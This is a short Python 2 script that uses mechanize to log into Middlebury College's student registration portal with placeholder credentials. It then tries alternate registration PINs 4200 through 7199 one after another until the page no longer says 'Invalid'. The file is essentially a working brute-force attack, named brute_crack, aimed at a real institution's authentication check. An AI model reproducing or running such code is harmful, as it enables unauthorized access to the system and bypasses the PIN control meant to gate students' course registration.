"""
This file is to be used in emergencies only, and requires modifying the source code here.


Modify lines 48 and 49, and 65

48 - Student ID
49 - Student PWD
65 - Term Code (Fall 2015 = 201590) 
"""



import mechanize
import cookielib
import urllib
import logging
import sys
import datetime
import time

def main(test_num):
    """
    Hoping to create a time dependent function, but for now everything is hardcoded, 
    Check the soure code for inputing classes and otherwise
    
    """
    
    
    br = mechanize.Browser()
    cj = cookielib.LWPCookieJar()
    br.set_cookiejar(cj)

    br.set_handle_equiv(True)
    br.set_handle_gzip(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)

    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

    r= br.open('https://ssb.middlebury.edu/PNTR/twbkwbis.P_WWWLogin?')

    # Select the second (index one) form
    br.select_form("loginform")

    # User credentials
    br.form['sid'] = '********'
    br.form['PIN'] = '******'

    # Login
    br.submit()

    # Open up term select page
    term_select = 'https://ssb.middlebury.edu/PNTR/bwskfreg.P_AltPin'
    
    # you can get the rval in other ways, but this will work for testing

    r = br.open(term_select)#####MUST CHANGE THIS VALUE BEFORE USING CODE

    #print(r)

    br.select_form(nr=1)

    br['term_in']=['201590']#####TERM CODE HERE 4- digit year
    
    response = br.submit()

    br.select_form(nr=1)
    #br.set_value(str(test_num) , nr=1)####  ALT PIN GOES HERE
    br.form['pin'] = str(test_num)
    response = br.submit()
    read = response.read()
    print str(test_num)
    
    if read.find("Invalid") == -1 :
        return str(test_num)
    else:
        return 0
    
def brute_crack():
    for i in range(3000):
        
        worked = main(i+4200)
        if worked != 0:
            print worked
            break
        
brute_crack()
